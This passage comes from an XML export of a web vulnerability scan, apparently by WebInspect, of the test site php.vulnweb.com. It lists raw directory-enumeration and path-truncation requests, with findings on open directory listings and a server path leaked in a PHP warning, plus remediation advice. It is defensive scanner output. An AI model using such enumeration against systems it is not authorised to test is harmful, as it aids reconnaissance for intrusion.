<br /><br /><b>For Development:</b><br />
This problem will be resolved by the web application  server administrator.  In general, do not rely on 'hidden' directories within the web root that can contain sensitive resources or web applications.  Assume an attacker knows about the existence of all directories and files on your web site, and protect them with proper access controls.

<br /><br /><b>For QA:</b><br />
This problem will be resolved by the web application  server administrator.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Implementing Basic Authentication in IIS</b><br /><a href="http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/abbca505-6f63-4267-aac1-1ea89d861eb4.mspx">http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/a

bbca505-6f63-4267-aac1-1ea89d861eb4.mspx</a><br /><br /><b>Implementing Basic Authentication in Apache</b><br /><a href="http://httpd.apache.org/docs/howto/auth.html#intro">http://httpd.apache.org/docs/howto/auth.html#intro</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="A1CEE9CF6012D777107AAAB260D61287"><![CDATA[GET /_mmServerScripts/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="A1CEE9CF6012D777107AAAB260D61287";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10214";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="41";smi="0";sc="1";ID="f8ef25ec";
X-Request-Memo: ID="9fcd99fc";sc="1";tid="46";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:57 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html
Content-Length: 400

<html>
<head><title>Index of /_mmServerScripts/</title></head>
<body>
<h1>Index of /_mmServerScripts/</h1><hr><pre><a href="../">../</a>
<a href="MMHTTPDB.php">MMHTTPDB.php</a>                                       11-May-2011 10:27                2111
<a href="mysql.php">mysql.php</a>                                          11-May-2011 10:27               10634
</pre><hr></body>
</html>
]]></RawResponse><Request id="A1CEE9CF6012D777107AAAB260D61287"><Method>GET</Method><Path>/_mmServerScripts/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="A1CEE9CF6012D777107AAAB260D61287";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10214";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="41";smi="0";sc="1";ID="f8ef25ec";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="9fcd99fc";sc="1";tid="46";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>Index of /_mmServerScripts/</title></head>
<body>
<h1>Index of /_mmServerScripts/</h1><hr><pre><a href="../">../</a>
<a href="MMHTTPDB.php">MMHTTPDB.php</a>                                       11-May-2011 10:27                2111
<a href="mysql.php">mysql.php</a>                                          11-May-2011 10:27               10634
</pre><hr></body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:57 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>400</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="9F54C716D48ADA2CD5B14E3489B25C09"><URL>http://php.vulnweb.com:80/AJAX/artists.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="9F54C716D48ADA2CD5B14E3489B25C09"><![CDATA[GET /AJAX/artists.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="9F54C716D48ADA2CD5B14E3489B25C09";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="215f8cce";
X-Request-Memo: ID="fafd587c";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:31 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 146

<items><item name="infoartist" id="1">r4w8173</item><item name="infoartist" id="2">Blad3</item><item name="infoartist" id="3">lyzae</item></items>]]></RawResponse><Request id="9F54C716D48ADA2CD5B14E3489B25C09"><Method>GET</Method><Path>/AJAX/</Path><File>artists</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="9F54C716D48ADA2CD5B14E3489B25C09";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="215f8cce";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="fafd587c";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<items><item name="infoartist" id="1">r4w8173</item><item name="infoartist" id="2">Blad3</item><item name="infoartist" id="3">lyzae</item></items>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:31 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>146</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="7AAFBE7AFFEC264E00527B0D190D2B5B"><URL>http://php.vulnweb.com:80/images/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="a27bc34b-4773-4f91-93a5-ed5f97c2d0d0"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10</EngineType><AttackHTTPRequest><![CDATA[GET /images/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="7AAFBE7AFFEC264E00527B0D190D2B5B";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10214";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="f5e8a9b0";
X-Request-Memo: ID="2cb45631";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>10214</VulnerabilityID><Severity>1</Severity><Name>Common Web Site Structure Directories</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Directory Enumeration vulnerabilities were discovered within your web application. Risks associated with an attacker discovering a directory on your application server depend upon what type of directory is discovered, and what types of files are contained within it.  The primary threat, other than accessing files containing sensitive information, is that an attacker can utilize the information discovered in that directory to perform other types of attacks.  Recommendations include restricting access to important directories or files by adopting a "need to know" requirement for both the document and server root, and turning off features such as Automatic Directory Listings that provide information that could be utilized by an attacker when formulating or conducting an attack. ]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />
You should evaluate the production requirements for the found directory.  If the directory is not required for production operation, then the directory and its contents should be removed or restricted by a server access control mechanism.  More information about implementing access control schemes can be found in the References.  Automatic directory indexing should also be disabled, if applicable.

<br /><br /><b>For Development:</b><br />
This problem will be resolved by the web application  server administrator.  In general, do not rely on 'hidden' directories within the web root that can contain sensitive resources or web applications.  Assume an attacker knows about the existence of all directories and files on your web site, and protect them with proper access controls.

<br /><br /><b>For QA:</b><br />
This problem will be resolved by the web application  server administrator.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Implementing Basic Authentication in IIS</b><br /><a href="http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/abbca505-6f63-4267-aac1-1ea89d861eb4.mspx">http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/a

bbca505-6f63-4267-aac1-1ea89d861eb4.mspx</a><br /><br /><b>Implementing Basic Authentication in Apache</b><br /><a href="http://httpd.apache.org/docs/howto/auth.html#intro">http://httpd.apache.org/docs/howto/auth.html#intro</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="7AAFBE7AFFEC264E00527B0D190D2B5B"><![CDATA[GET /images/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="7AAFBE7AFFEC264E00527B0D190D2B5B";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10214";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="f5e8a9b0";
X-Request-Memo: ID="2cb45631";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:58 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html
Content-Length: 377

<html>
<head><title>Index of /images/</title></head>
<body>
<h1>Index of /images/</h1><hr><pre><a href="../">../</a>
<a href="logo.gif">logo.gif</a>                                           11-May-2011 10:27                6660
<a href="remark.gif">remark.gif</a>                                         11-May-2011 10:27                  79
</pre><hr></body>
</html>
]]></RawResponse><Request id="7AAFBE7AFFEC264E00527B0D190D2B5B"><Method>GET</Method><Path>/images/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="7AAFBE7AFFEC264E00527B0D190D2B5B";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10214";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="f5e8a9b0";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="2cb45631";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>Index of /images/</title></head>
<body>
<h1>Index of /images/</h1><hr><pre><a href="../">../</a>
<a href="logo.gif">logo.gif</a>                                           11-May-2011 10:27                6660
<a href="remark.gif">remark.gif</a>                                         11-May-2011 10:27                  79
</pre><hr></body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:58 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>377</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="28689C0AD620F9E1BEDB5DFC4DA93935"><URL>http://php.vulnweb.com:80/AJAX/infoartist.php?id=1</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="28689C0AD620F9E1BEDB5DFC4DA93935"><![CDATA[GET /AJAX/infoartist.php?id=1 HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="28689C0AD620F9E1BEDB5DFC4DA93935";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="cf92900d";
X-Request-Memo: ID="cd228dde";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:32 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 1343

<iteminfo><name>r4w8173</name><description>&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
    Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;
&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
    Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;</description></iteminfo>
]]></RawResponse><Request id="28689C0AD620F9E1BEDB5DFC4DA93935"><Method>GET</Method><Path>/AJAX/</Path><File>infoartist</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>id=1</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>id</Name><Value>1</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="28689C0AD620F9E1BEDB5DFC4DA93935";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="cf92900d";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="cd228dde";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>r4w8173</name><description>&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
    Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;
&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
    Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;</description></iteminfo>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:32 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>1343</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="8C8A2ED0B1865A85196EE48C7C6ED8C5"><URL>http://php.vulnweb.com:80/AJAX/infoartist.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="5033b901-197f-4938-a710-a53612afcdd7"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>810</VulnerabilityID><Severity>1</Severity><Name>Possible Server Path Disclosure (unix)</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="375" length="28" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A minor vulnerability has been discovered within your web application due to the the presence of a fully qualified path name to the root of your system. This most often occurs in context of an error being produced by the web application. Fully qualified server path names allow an attacker to know the file system structure of the web server, which is a baseline for many other types of attacks to be successful. Recommendations include adopting a consistent error handling scheme and mechanism that prevents fully qualified path names from being displayed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
To verify the issue, click the 'HTTP Response' button on the properties view and review the highlighted areas to determine the Unix path found.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />

Don't display fully qualified pathnames as part of error or informational messages.  At the least, fully qualified pathnames can provide an attacker with important information about the architecture of web application.  <br /><br /><b>For Security Operations: </b><br /><br />

The following recommendations will help to ensure that a potential attacker is not deriving valuable information from any error message that is presented. 

<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For  
instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks  
actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><br /><br /><li><b>Informational Error Messages: </b>
Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and  
column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as  
possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><br /><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or  
other data that could be utilized by an attacker when orchestrating an attack. </li></ul><b>For QA:</b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to  
cause internal errors to gauge the reaction of the site.<br /><br />

The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file  
that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker? It is  
often a seemingly innocuous piece of information that provides an attacker with the means to discover something else which he can then utilize when  
conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="8C8A2ED0B1865A85196EE48C7C6ED8C5"><![CDATA[GET /AJAX/infoartist.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/infoartist.php?id=3
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="8C8A2ED0B1865A85196EE48C7C6ED8C5";PSID="DFFD46A7DFB364CD49AE94CB85E0CE16";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="68";tt="11";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="7a47557b";
X-Request-Memo: ID="152b8904";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:45 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 148

<iteminfo>
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/AJAX/infoartist.php on line 7
</iteminfo>
